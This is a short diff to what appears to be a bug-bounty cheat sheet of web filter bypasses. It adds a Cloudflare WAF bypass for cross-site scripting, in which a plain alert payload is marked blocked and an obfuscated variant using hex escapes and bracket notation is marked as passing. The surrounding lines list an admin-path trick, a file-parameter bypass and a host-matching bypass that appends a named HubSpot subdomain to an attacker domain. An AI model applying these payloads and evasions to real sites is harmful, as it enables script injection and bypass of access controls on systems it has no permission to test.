@@ -162,7 +162,16 @@ https://exmale.com/admin..;
 -------------------
 when file upload => /?file=file.php   blocked
                    /?file===file.php   passed
-                   
+                 
+Cloudflare bypass
+
+"-alert(0)-"   :  ❌
+"-top['al\x65rt']('sailay')-"   : ✅                 
+                 
+                 
+                 
+                 
+                 
                    
 Bypass matching on host contain growanz.hubspot.com
     growanz.hubspot.com.mydomain.com
